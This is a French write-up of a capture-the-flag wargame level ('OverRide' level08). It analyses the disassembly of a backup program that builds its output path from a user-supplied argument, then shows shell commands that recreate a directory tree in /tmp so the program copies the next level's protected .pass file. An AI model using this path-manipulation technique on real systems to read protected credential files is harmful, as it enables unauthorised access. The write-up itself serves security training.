## Level 08

### Analyse
Le programme prend un fichier en argument et tente d'en créer une copie dans le répertoire backups/. L'analyse montre qu'il utilise un chemin relatif pour la destination, ce qui permet de détourner la création du fichier pour lire des fichiers protégés comme .pass.


Le programme vérifie d'abord qu'un argument est fourni, puis tente d'ouvrir un fichier de log dans ./backups/:
```bash
0x0000000000400a4a <+90>:  mov    $0x400d6b,%edx ; "./backups/"
0x0000000000400a5a <+106>: callq  0x4007c0 <fopen@plt>
```

Il concatène ensuite le nom du fichier passé en argument avec la chaîne ./backups/ pour créer le chemin de destination:
```bash
0x0000000000400b7d <+397>: callq  0x400750 <strncat@plt>
0x0000000000400b98 <+424>: callq  0x4007b0 <open@plt>
```

Si on passe /home/users/level09/.pass, le programme essaiera d'ouvrir ./backups//home/users/level09/.pass. Pour que cela fonctionne, toute l'arborescence de dossiers doit exister dans backups/.

### Exploitation

Comme nous avons les droits d'écriture dans /tmp, nous allons recréer l'arborescence nécessaire pour que le programme puisse copier le fichier .pass là où il le souhaite.

On prépare le terrain dans /tmp :
```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
```

On lance le binaire en lui donnant le chemin complet du fichier cible. Le programme va alors copier le contenu de .pass dans notre dossier temporaire :
```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
```
